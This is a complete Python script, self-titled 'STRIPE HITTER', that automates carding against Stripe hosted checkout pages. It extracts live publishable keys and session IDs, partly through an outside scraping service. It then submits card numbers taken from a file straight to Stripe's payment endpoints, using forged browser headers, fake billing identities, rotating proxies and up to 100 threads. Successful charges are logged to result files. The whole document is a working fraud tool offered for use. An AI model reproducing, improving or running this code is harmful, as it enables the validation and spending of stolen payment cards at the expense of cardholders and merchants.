
import sys
import os

if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

print("\033[1;31m" + """
███████╗ ██████╗██████╗ ██╗██████╗ ████████╗
██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝
███████╗██║     ██████╔╝██║██████╔╝   ██║   
╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   
███████║╚██████╗██║  ██║██║██║        ██║   
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   

BY @MUMIRU_BRO
""" + "\033[0m")

import asyncio
import json
import re
import time
import uuid
import base64
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import quote, unquote
import random

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    pass

_0x4f2b = base64.b64decode('QG11bWlydV9icm8=').decode()

def banner():
    author = _0x4f2b
    try:
        print(f"{Fore.RED}"+'script by @mumiru_backup')
        print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*50)
        print(f"{Fore.CYAN}{Style.BRIGHT}       STRIPE HITTER BY {author}")
        print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*50)
    except NameError:
        print('script by @mumiru_backup')
        print("="*50)
        print(f"       STRIPE HITTER BY {author}")
        print("="*50)

class StripeCheckoutProcessor:
    def __init__(self):
        self.pk = None
        self.cs = None
        self.extracted_values = {}
        self.lock = threading.Lock()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Edge/122.0.2365.52",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0"
        ]
        
    def get_ua(self):
        return random.choice(self.user_agents)

    def log(self, message, icon="🔍"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"{icon} [{timestamp}] {message}"
        print(log_entry)
    
    def extract_from_api(self, checkout_url, proxy=None):
        print("\n" + "="*60)
        print("🔍 EXTRACTING FROM API")
        print("="*60)
        
        try:
            encoded = quote(checkout_url, safe='')
            api_url = f"https://rylax.pro/bot.js/process?url={encoded}&cc=dummy"
            
            self.log(f"Requesting API: {api_url}", "🌐")
            
            headers = {
                "User-Agent": self.get_ua(),
                "Accept": "application/json, text/plain, */*",
            }
            
            response = requests.get(api_url, headers=headers, timeout=30, proxies=proxy)
            
            if response.status_code != 200:
                self.log(f"API Error: Status {response.status_code}", "❌")
                return None, None
            
            data = response.json()
            
            if not data.get("success"):
                error_msg = data.get("error", "Unknown API error")
                self.log(f"API Error: {error_msg}", "❌")
                return None, None
            
            checkout = data["checkout_data"]
            pk_live = checkout.get("pk_live")
            cs_live = checkout.get("cs_live")
            
            if pk_live:
                self.pk = pk_live
                self.log(f"Extracted PK: {pk_live[:30]}...", "✅")
            
            if cs_live:
                self.cs = cs_live
                self.log(f"Extracted CS: {cs_live[:30]}...", "✅")
                
            if "amount" in checkout:
                self.extracted_values['expected_amount'] = str(checkout["amount"])
                amount_usd = int(checkout["amount"]) / 100
                self.log(f"Found amount in API: ${amount_usd:.2f}", "💰")
            
            return pk_live, cs_live
            
        except Exception as e:
            self.log(f"API extraction failed: {str(e)}", "❌")
            return None, None
    
    def manual_extract_from_url(self, checkout_url, proxy=None):
        print("\n" + "="*60)
        print("🔄 MANUAL EXTRACTION FROM URL")
        print("="*60)
        
        cs_match = re.search(r'cs_(live|test)_([a-zA-Z0-9_]+)', checkout_url)
        if cs_match:
            self.cs = cs_match.group(0)
            cs_mode = cs_match.group(1)
            self.log(f"Extracted CS from URL: {self.cs[:30]}... ({cs_mode.upper()})", "✅")
        else:
            self.log("❌ No CS found in URL", "❌")
            return False
        
        try:
            headers = {
                "User-Agent": self.get_ua(),
            }
            
            response = requests.get(checkout_url, headers=headers, timeout=10, proxies=proxy)
            
            if response.status_code == 200:
                content = response.text
                
                pk_patterns = [
                    r'(pk_live_[a-zA-Z0-9_]{80,150})',
                    r'(pk_test_[a-zA-Z0-9_]{80,150})',
                    r'publishableKey:\s*["\'](pk_(live|test)_[a-zA-Z0-9_]+)["\']',
                    r'key=([^&\'"\s]+)',
                ]
                
                for pattern in pk_patterns:
                    match = re.search(pattern, content)
                    if match:
                        pk_value = match.group(1) if match.groups() else match.group(0)
                        if pk_value.startswith('pk_'):
                            self.pk = pk_value
                            self.log(f"Found PK in page: {pk_value[:30]}...", "✅")
                            break
                
                amount_patterns = [
                    r'"amount":\s*(\d+)',
                    r'"total":\s*(\d+)',
                    r'amount:\s*(\d+)',
                    r'data-amount="(\d+)"',
                    r'Amount.*?\$(\d+\.?\d*)',
                ]
                
                for pattern in amount_patterns:
                    match = re.search(pattern, content)
                    if match:
                        amount = match.group(1)
                        if '.' in amount:
                            amount = str(int(float(amount) * 100))
                        
                        if amount.isdigit():
                            self.extracted_values['expected_amount'] = amount
                            amount_usd = int(amount) / 100
                            self.log(f"Found amount: ${amount_usd:.2f}", "💰")
                            break
                            
            else:
                self.log(f"Page request failed: {response.status_code}", "⚠️")
                
        except Exception as e:
            self.log(f"Manual extraction error: {str(e)}", "⚠️")
        
        return self.pk is not None
    
    def display_results(self):
        print("\n" + "="*60)
        print("🎯 EXTRACTION RESULTS")
        print("="*60)
        
        cs_mode = 'LIVE' if self.cs and 'live' in self.cs else 'TEST'
        pk_mode = 'LIVE' if self.pk and 'live' in self.pk else 'TEST'
        
        print(f"🔑 PK: {self.pk if self.pk else 'NOT FOUND'}")
        print(f"   Mode: {pk_mode}")
        print(f"🔐 CS: {self.cs if self.cs else 'NOT FOUND'}")
        print(f"   Mode: {cs_mode}")
        
        if self.extracted_values:
            print("\n📊 EXTRACTED VALUES:")
            
            if 'expected_amount' in self.extracted_values:
                amount = self.extracted_values['expected_amount']
                amount_usd = int(amount) / 100
                print(f"   expected_amount: ${amount_usd:.2f} ({amount} cents)")
            
            for key in ['init_checksum', 'js_checksum', 'rv_timestamp', 'version', 'eid']:
                if key in self.extracted_values:
                    value = self.extracted_values[key]
                    if value:
                        display = str(value)
                        if len(display) > 30:
                            display = display[:30] + "..."
                        print(f"   {key}: {display}")
        
        if self.pk and self.cs:
            print("\n✅ Ready for payment processing!")
        else:
            print("\n❌ Missing PK or CS - cannot proceed")
        
        print("="*60)
    
    def get_cc_details(self):
        print("\n" + "="*60)
        print("💳 ENTER CARD DETAILS")
        print("="*60)
        print("Format: NUMBER|MM|YYYY|CVC or NUMBER|MM|yyyy|CVC")
        print("Example: 4031630918893446|11|2029|099")
        print("="*60)
        
        while True:
            cc_input = input("\nCard: ").strip()
            
            if not cc_input:
                print("❌ Please enter card details")
                continue
                
            if '|' in cc_input:
                parts = cc_input.split('|')
                if len(parts) >= 4:
                    card_number = parts[0].strip().replace(' ', '')
                    exp_month = parts[1].strip()
                    exp_year = parts[2].strip()
                    cvc = parts[3].strip()
                    
                    if len(exp_year) == 2:
                        exp_year = '20' + exp_year
                    elif len(exp_year) != 4:
                        print("❌ Invalid year format (use YY or YYYY)")
                        continue
                    
                    if len(card_number) < 13 or len(card_number) > 19:
                        print("❌ Invalid card number (13-19 digits)")
                        continue
                    
                    if not exp_month.isdigit() or not (1 <= int(exp_month) <= 12):
                        print("❌ Invalid month (01-12)")
                        continue
                    
                    return {
                        'number': card_number,
                        'exp_month': exp_month.zfill(2),
                        'exp_year': exp_year,
                        'cvc': cvc
                    }
            
            print("❌ Invalid format. Use: NUMBER|MM|YYYY|CVC")
    
    def generate_fresh_session(self):
        base = str(uuid.uuid4()).replace('-', '')
        return {
            'guid': base[:8] + base[8:16] + 'b',
            'muid': base[16:24] + base[24:32] + 'b',
            'sid': base[32:40] + base[40:48] + 'b',
            'client_session_id': str(uuid.uuid4()),
            'checkout_config_id': str(uuid.uuid4())
        }
    
    def make_request_1(self, card_details, proxy=None):
        session = self.generate_fresh_session()
        
        headers = {
            'Host': 'api.stripe.com',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'User-Agent': self.get_ua(),
            'Accept': 'application/json',
            'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Gpc': '1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://checkout.stripe.com',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://checkout.stripe.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=1, i'
        }
        
        random_email = f"user{int(time.time())}{uuid.uuid4().hex[:6]}@example.com"
        random_name = f"Test Customer {uuid.uuid4().hex[:8]}"
        
        data_parts = [
            f'type=card',
            f'card%5Bnumber%5D={card_details["number"]}',
            f'card%5Bcvc%5D={card_details["cvc"]}',
            f'card%5Bexp_month%5D={card_details["exp_month"]}',
            f'card%5Bexp_year%5D={card_details["exp_year"][-2:]}',
            f'billing_details%5Bname%5D={quote(random_name)}',
            f'billing_details%5Bemail%5D={quote(random_email)}',
            f'billing_details%5Baddress%5D%5Bcountry%5D=US',
            f'billing_details%5Baddress%5D%5Bline1%5D=123+Main+St',
            f'billing_details%5Baddress%5D%5Bcity%5D=Anytown',
            f'billing_details%5Baddress%5D%5Bpostal_code%5D=12345',
            f'billing_details%5Baddress%5D%5Bstate%5D=CA',
            f'guid={session["guid"]}',
            f'muid={session["muid"]}',
            f'sid={session["sid"]}',
            f'key={self.pk}',
            f'payment_user_agent=stripe.js%2F83c85f9ea0%3B+stripe-js-v3%2F83c85f9ea0%3B+checkout',
            f'client_attribution_metadata%5Bclient_session_id%5D={session["client_session_id"]}',
            f'client_attribution_metadata%5Bcheckout_session_id%5D={self.cs}',
            f'client_attribution_metadata%5Bmerchant_integration_source%5D=checkout',
            f'client_attribution_metadata%5Bmerchant_integration_version%5D=hosted_checkout',
            f'client_attribution_metadata%5Bpayment_method_selection_flow%5D=automatic',
            f'client_attribution_metadata%5Bcheckout_config_id%5D={session["checkout_config_id"]}'
        ]
        
        data = '&'.join(data_parts)
        
        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=30,
                proxies=proxy
            )
            
            try:
                response_json = response.json()
                if 'id' in response_json and response_json['id'].startswith('pm_'):
                    return True, response_json, ""
                else:
                    error_msg = response_json.get('error', {}).get('message', 'No payment method ID in response')
                    return False, response_json, error_msg
                    
            except json.JSONDecodeError:
                return False, {"error": {"message": "Invalid JSON response"}}, response.text[:500]
                
        except Exception as e:
            return False, {"error": {"message": str(e)}}, str(e)
    
    def get_expected_amount(self):
        print("\n" + "="*60)
        print("💰 ENTER PAYMENT AMOUNT")
        print("="*60)
        print("The API didn't extract the amount.")
        print("Please enter the correct amount shown on the checkout page.")
        print("Examples: 4.99 for $4.99, or 499 for 499 cents")
        print("="*60)
        
        while True:
            try:
                amount_input = input("\n💵 Enter amount: ").strip()
                
                if '.' in amount_input:
                    amount_dollars = float(amount_input)
                    expected_amount = str(int(amount_dollars * 100))
                else:
                    expected_amount = str(int(amount_input))
                
                if int(expected_amount) > 0:
                    amount_usd = int(expected_amount) / 100
                    print(f"✅ Using amount: ${amount_usd:.2f} ({expected_amount} cents)")
                    self.extracted_values['expected_amount'] = expected_amount
                    return expected_amount
                else:
                    print("❌ Amount must be greater than 0")
            except ValueError:
                print("❌ Invalid amount. Example: 4.99 or 499")
    
    def make_request_2(self, payment_method_id, proxy=None):
        cs_mode = 'LIVE' if self.cs and 'live' in self.cs else 'TEST'
        
        expected_amount = self.extracted_values.get('expected_amount')
        if not expected_amount:
            expected_amount = self.get_expected_amount()
        
        session = self.generate_fresh_session()
        
        headers = {
            'Host': 'api.stripe.com',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'User-Agent': self.get_ua(),
            'Accept': 'application/json',
            'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Gpc': '1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://checkout.stripe.com',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://checkout.stripe.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=1, i'
        }
        
        init_checksum = self.extracted_values.get('init_checksum', '')
        js_checksum = self.extracted_values.get('js_checksum', '')
        rv_timestamp = self.extracted_values.get('rv_timestamp', '')
        version = self.extracted_values.get('version', '83c85f9ea0')
        eid = self.extracted_values.get('eid', 'NA')
        
        amount_usd = int(expected_amount) / 100
        
        data_parts = [
            f'eid={eid}',
            f'payment_method={payment_method_id}',
            f'expected_amount={expected_amount}',
            f'expected_payment_method_type=card',
            f'guid={session["guid"]}',
            f'muid={session["muid"]}',
            f'sid={session["sid"]}',
            f'key={self.pk}',
            f'version={version}',
            f"passive_captcha_token=''",
            f'passive_captcha_ekey=',
            f'referrer=https%3A%2F%2Freplit.com',
            f'client_attribution_metadata%5Bclient_session_id%5D={session["client_session_id"]}',
            f'client_attribution_metadata%5Bcheckout_session_id%5D={self.cs}',
            f'client_attribution_metadata%5Bmerchant_integration_source%5D=checkout',
            f'client_attribution_metadata%5Bmerchant_integration_version%5D=hosted_checkout',
            f'client_attribution_metadata%5Bpayment_method_selection_flow%5D=automatic',
            f'client_attribution_metadata%5Bcheckout_config_id%5D={session["checkout_config_id"]}'
        ]
        
        if init_checksum: data_parts.append(f'init_checksum={init_checksum}')
        if js_checksum: data_parts.append(f'js_checksum={js_checksum}')
        if rv_timestamp: data_parts.append(f'rv_timestamp={rv_timestamp}')
        
        data = '&'.join(data_parts)
        
        url = f'https://api.stripe.com/v1/payment_pages/{self.cs}/confirm'
        
        try:
            response = requests.post(
                url,
                headers=headers,
                data=data,
                timeout=30,
                proxies=proxy
            )
            
            try:
                response_json = response.json()
                
                if response_json.get('status') in ['succeeded', 'requires_action', 'processing', 'requires_capture']:
                    return True, response_json, response_json.get('status')
                elif 'error' in response_json:
                    error_msg = response_json['error'].get('message', 'Unknown error')
                    return False, response_json, error_msg
                return False, response_json, "Unknown response status"
            except json.JSONDecodeError:
                return False, {"error": {"message": "Invalid JSON response"}}, response.text[:1000]
                
        except Exception as e:
            return False, {"error": {"message": str(e)}}, str(e)
    
    def process_payment(self, card_details, proxy=None):
        if not self.pk or not self.cs:
            return False, "Missing PK or CS"
        
        try:
            success_r1, resp1_data, msg_r1 = self.make_request_1(card_details, proxy)
            
            if not success_r1:
                self.save_results(card_details, resp1_data, None)
                return False, f"Request 1 Failed: {msg_r1}"
            
            pm_id = resp1_data.get('id')
            if not pm_id:
                self.save_results(card_details, resp1_data, None)
                return False, "Request 1 Failed: No payment method ID in response"
            
            success_r2, resp2_data, msg_r2 = self.make_request_2(pm_id, proxy)
            
            if not success_r2:
                self.save_results(card_details, resp1_data, resp2_data)
                return False, f"Request 2 Failed: {msg_r2}"
            
            self.save_results(card_details, resp1_data, resp2_data)
            
            final_status = resp2_data.get('status')
            if final_status == 'succeeded':
                return True, "SUCCESS: Charged"
            elif final_status == 'requires_action':
                return True, "3DS REQUIRED"
            elif final_status == 'processing':
                return True, "PROCESSING"
            else:
                return False, f"Unknown Status: {final_status}"
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def save_results(self, card_details, resp1_data, resp2_data):
        cc_str = f"{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}"
        
        status = None
        if resp2_data:
            status = resp2_data.get('status')
        
        if status == 'succeeded':
            filename = 'charged succeed.txt'
            line = f"{cc_str} -> SUCCESS: Charged"
        elif status == 'requires_action':
            filename = '3d required.txt'
            line = f"{cc_str} -> 3DS REQUIRED"
        elif status == 'processing':
            filename = 'charged succeed.txt'
            line = f"{cc_str} -> PROCESSING"
        elif resp2_data and 'error' in resp2_data:
            msg = resp2_data['error'].get('message', 'Declined')
            filename = 'declined.txt'
            line = f"{cc_str} -> {msg}"
        elif not resp1_data or 'id' not in resp1_data:
            filename = 'declined.txt'
            if resp1_data and 'error' in resp1_data:
                line = f"{cc_str} -> Request 1: {resp1_data['error'].get('message', 'Failed')}"
            else:
                line = f"{cc_str} -> Request 1 Failed"
        else:
            filename = 'error_unknown.txt'
            line = f"{cc_str} -> Unknown Error or Status: {status}"

        try:
            with self.lock:
                with open(filename, 'a', encoding='utf-8') as f:
                    f.write(f"{line}\n")
            print(f"💾 Result logged to: {filename}")
        except Exception as e:
            print(f"❌ Failed to save result to {filename}: {str(e)}")
    
    def parse_proxy(self, proxy_str):
        proxy_str = proxy_str.strip()
        if not proxy_str: return None
        
        if proxy_str.count(':') == 3:
            ip, port, user, pw = proxy_str.split(':')
            return {
                "http": f"http://{user}:{pw}@{ip}:{port}",
                "https": f"http://{user}:{pw}@{ip}:{port}"
            }
        elif '@' in proxy_str and ':' in proxy_str:
            return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
        elif ':' in proxy_str:
            return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
        
        return None

    def interactive(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            banner()
            
            print(f"{Fore.CYAN}1. Single Check")
            print(f"2. Mass Check")
            print(f"0. Exit{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.YELLOW}Select option: {Style.RESET_ALL}").strip()
            
            if choice == '0':
                break
                
            if choice not in ['1', '2']:
                continue

            print("\n" + "-"*60)
            print("📝 Enter Stripe Checkout Link:")
            url = input("URL: ").strip()
            if not url: continue

            self.pk = None
            self.cs = None
            self.extracted_values = {}
            pk, cs = self.extract_from_api(url)
            if not (pk and cs):
                success = self.manual_extract_from_url(url)
            
            if not (self.pk and self.cs):
                print(f"{Fore.RED}❌ Extraction failed!{Style.RESET_ALL}")
                time.sleep(2)
                continue

            self.display_results()

            if choice == '1':
                card_details = self.get_cc_details()
                
                proxy_input = input(f"\n{Fore.YELLOW}Proxy (optional, IP:PORT or IP:PORT:USER:PASS): {Style.RESET_ALL}").strip()
                proxy = self.parse_proxy(proxy_input)
                
                success, msg = self.process_payment(card_details, proxy)
                if success:
                    print(f"\n{Fore.GREEN}✅ {card_details['number']} -> {msg}{Style.RESET_ALL}")
                else:
                    print(f"\n{Fore.RED}❌ {card_details['number']} -> {msg}{Style.RESET_ALL}")
                input("\nPress Enter to continue...")

            elif choice == '2':
                cc_file = input(f"\n{Fore.YELLOW}Enter CC file path (e.g., cc.txt): {Style.RESET_ALL}").strip()
                if not os.path.exists(cc_file):
                    print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
                    time.sleep(2)
                    continue

                proxy_file = input(f"{Fore.YELLOW}Enter proxy file path (optional, press enter to skip): {Style.RESET_ALL}").strip()
                proxies = []
                if proxy_file and os.path.exists(proxy_file):
                    with open(proxy_file, 'r') as f:
                        proxies = [line.strip() for line in f if line.strip()]
                
                while True:
                    try:
                        thread_count = input(f"{Fore.YELLOW}Enter number of threads (1-100): {Style.RESET_ALL}").strip()
                        if not thread_count:
                            thread_count = 5
                        thread_count = int(thread_count)
                        if 1 <= thread_count <= 100:
                            break
                        print(f"{Fore.RED}Please enter a number between 1 and 100{Style.RESET_ALL}")
                    except ValueError:
                        print(f"{Fore.RED}Invalid number{Style.RESET_ALL}")

                with open(cc_file, 'r') as f:
                    cards = [line.strip() for line in f if line.strip()]

                self.log(f"Loaded {len(cards)} cards and {len(proxies)} proxies. Starting with {thread_count} threads.")
                
                if not self.extracted_values.get('expected_amount'):
                    self.get_expected_amount()

                def check_card(index_cc):
                    i, cc_str = index_cc
                    cc_parts = cc_str.split('|')
                    if len(cc_parts) < 4:
                        with self.lock:
                            print(f"{Fore.RED}[-] {cc_str} -> Invalid Format{Style.RESET_ALL}")
                        return
                    
                    card_details = {
                        'number': cc_parts[0],
                        'exp_month': cc_parts[1].zfill(2),
                        'exp_year': '20' + cc_parts[2] if len(cc_parts[2]) == 2 else cc_parts[2],
                        'cvc': cc_parts[3]
                    }

                    proxy = None
                    if proxies:
                        proxy = self.parse_proxy(proxies[i % len(proxies)])
                    
                    with self.lock:
                        print(f"\n[*] Checking card {i+1}/{len(cards)}: {card_details['number']}")
                    
                    success, msg = self.process_payment(card_details, proxy)

                    with self.lock:
                        if success:
                            print(f"{Fore.GREEN}[+] {cc_str} -> {msg}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}[-] {cc_str} -> {msg}{Style.RESET_ALL}")

                with ThreadPoolExecutor(max_workers=thread_count) as executor:
                    executor.map(check_card, enumerate(cards))
                
                print(f"\n{Fore.YELLOW}Mass check complete. Results saved to categorized text files.{Style.RESET_ALL}")
                input("Press Enter to continue...")

def main():
    try:
        processor = StripeCheckoutProcessor()
        processor.interactive()
        
    except KeyboardInterrupt:
        print("\n\n⚠️ Interrupted")
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")

if __name__ == "__main__":
    try:
        import requests
        import colorama
    except ImportError:
        print("Installing required packages...")
        import subprocess
        import sys
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
        print("✅ Packages installed!")
    
    main()